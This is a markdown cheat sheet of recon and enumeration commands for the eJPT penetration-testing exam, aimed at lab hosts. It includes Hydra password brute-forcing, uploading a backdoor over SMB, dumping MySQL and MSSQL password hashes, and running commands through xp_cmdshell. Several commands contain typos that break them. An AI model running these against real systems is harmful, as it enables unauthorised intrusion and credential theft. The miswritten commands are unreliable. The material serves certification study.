# eJPT
# All needed commands and sources for eJPT


```
fping -a -g 10.10.10.0/24 2> fping.txt
```
# Information Gathering:
## Passive Information Gathering:
https://hackersploit.org/
```
host hackersploit.org
```
```
whatweb hackersploit.org
```
```
whois hackersploit.org
```
#### /Internet Data Mining:
https://www.netcraft.com

#### /DSN Recon:
```
dnsrecon hackersploit.org
```
OR can use: https://dnsdumpster.com 

#### /Addons:
- Built with
- Wappalyzer

#### /WAF (Web Application Firewall):
```
wafw00f hackersploit.org
```
#### /Subdomain Enumeration:
```
sublist3r -d hackersploit.org -e google, yahoo
```
#### /Exploit-DB:
https://www.exploit-db.com/

#### /Email Harvesting With theHarvester:
```
theHarvester -d hackersploit.org -b google,linkedin
```
#### /Leaked Password Databases
https://haveibeenpwned.com/

## Active Information Gathering:

#### /DNS Enum:
```
dnsrecon -d hackersploit.otg
```
```
dnsenum hackersploit.otg
```
#### /DNS lookup
```
dig axfr @nsztm1.digi.ninja hackersploit.otg
```
## Footprinting & Scanning:
#### /Mapping a Network:
```
sudo arp-scan -I tap0 -g 10.10.2.0/24
```
```
fping -I tap0 -g 10.10.2.0/24 -a
```
```
fping -I tap0 -g 10.10.2.0/24 -a 2>/dev/null
```
## Enumeration:
#### /SMB Windows Discover & Mount:
```
nmap -T4 10.10.20.0/20 --open
```
```
nmap -p 445 --script smb-protocols 10.10.20.2
```
```
nmap -p 445 --script smb-security-mode 10.10.20.2
```
```
nmap -p 445 --script smb-enum-sessions 10.10.20.2
```
```
nmap -p 445 --script smb-enum-sessions --script-args smbusername=admin,smbpassword=admin 10.10.20.2
```
```
nmap -p 445 --script smb-enum-shares 10.10.20.2
```
```
nmap -p 445 --script smb-enum-shares --script-args smbusername=admin,smbpassword=admin 10.10.20.2
```
```
nmap -p 445 --script smb-enum-users --script-args smbusername=admin,smbpassword=admin 10.10.20.2
```
```
nmap -p 445 --script smb-enum-stats --script-args smbusername=admin,smbpassword=admin 10.10.20.2
```
```
nmap -p 445 --script smb-enum-domains --script-args smbusername=admin,smbpassword=admin 10.10.20.2
```
```
nmap -p 445 --script smb-enum-groups --script-args smbusername=admin,smbpassword=admin 10.10.20.2
```
```
nmap -p 445 --script smb-enum-services --script-args smbusername=admin,smbpassword=admin 10.10.20.2
```
```
nmap -p 445 --script smb-protocols 10.10.20.2
```
```
smbmap -u guest -p "" -d . -H 10.10.20.2
```
```
smbmap -u admin -p admin -d . -H 10.10.20.2
```
```
smbmap -u admin -p admin -x . -H 10.10.20.2 -x 'ipconfig'
```
```
smbmap -H 10.10.20.2 -u admin -p 'admin' -r 'C$'
```
Upload Backdoor:
```
smbmap -H 10.10.20.2 -u admin -p 'admin' --upload '/root/backdoor' 'C$\backdoor'
```
Download file:
```
smbmap -H 10.10.20.2 -u admin -p 'admin' --download 'C$\flag.txt'
```
```
nmap 10.10.20.3 -p 445 --script smb-os-discovery
```
Metasploit:
```
use auxiliary/scanner/smb/smb_version
```
```
use auxiliary/scanner/smb/smb2
```
```
use auxiliary/scanner/smb/smb_enumshares
```
```
use auxiliary/scanner/smb/smb_login
```
```
use auxiliary/scanner/smb/pipe_auditor
```
nmblookup:
```
nmblookup -A 10.10.20.2
```
smbclient:
```
smbclient -L 10.10.20.3 -N
```
rpcclient:
```
rpcclient -U "" 10.10.20.3
```
enum4linux:
```
enum4linux -o 10.10.20.3
```
Hydra:
```
gzip -d /usr/share/wordlists/rockyou.txt.gz
```
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.20.3 smb
```
SMBmP:
```
SMBMAP -H 10.10.20.2 -u admin -p admin
```
#### /FTP:

```
nmap 10.10.20.2 -p 21 --script ftp-anon
```
```ftp 10.10.20.3
```
#### /SSH:

```
nmap 10.10.20.3 -p 22 --script ssh2-enum-algos
```
```
nmap 10.10.20.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full
```
```
nmap 10.10.20.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"
```
Hydra:
```
gzip -d /usr/share/wordlists/rockyou.txt.gz
```
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.20.3 ssh
```
Metasploit:
```
use auxiliary/scanner/ssh/ssh_login
```
#### /HTTP:

```
nmap 10.10.20.3 -sV -p 80 --script http-enum
```
```
nmap 10.10.20.3 -sV -p 80 --script http-headers
```
```
nmap 10.10.20.3 -sV -p 80 --script http-methods --script-args http-methods.url-path=/webdav/
```
```
nmap 10.10.20.3 -sV -p 80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/
```
```
nmap 10.10.20.3 -sV -p 80 -script banner
```
Metasploit:
```
use auxiliary/scanner/http/http_version
```
```
use auxiliary/scanner/http/brute_dirs
```
```
use auxiliary/scanner/http/robots_txt
```
curl:
```
curl 10.10.20.3 | more
```
Wget:
```
wget "http://10.10.20.3/index"
```
```
brows --startup-url 10.10.20.3
```
```
lynx http://10.10.20.3
```

#### /SQL:

```
mysql -h 10.10.20.3 -u root
```
Metasploit:
```
use auxiliary/scanner/mysql/mysql_writable_dirs
set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
```
```
use auxiliary/scanner/mysql/mysql_hashdump
```
```
use auxiliary/scanner/mysql/mysql_login
```
```
use auxiliary/admin/mssql/mssql_enum_sql_login
```
```
use auxiliary/admin/mssql/mssql_exec
```
```
use auxiliary/admin/mssql/mssql_enum_domain_accounts
```
Nmap:
```
nmap 10.10.20.3 -sV -p 3306 --script=mysql-empty-passwords
```
```
nmap 10.10.20.3 -sV -p 3306 --script=mysql-info
```
```
nmap 10.10.20.3 -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
```
```
nmap 10.10.20.3 -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
```
```
nmap 10.10.20.3 -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''"
```
```
nmap 10.10.20.3 -p 1433 --script ms-sql-info
```
```
nmap 10.10.20.3 -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
```
```
nmap 10.10.20.3 -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt
```
```
nmap 10.10.20.3 -p 1433 --script ms-sql-empty-password
```
```
nmap 10.10.20.3 -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt
```
```
nmap 10.10.20.3 -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
```
```
nmap 10.10.20.3 -p 1433 --script ms-sql-xp--cmdshell --scipt-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
```
```
nmap 10.10.20.3 -p 1433 --script ms-sql-xp--cmdshell --scipt-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"
```
Hydra:
```
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.20.3 mysql
```



















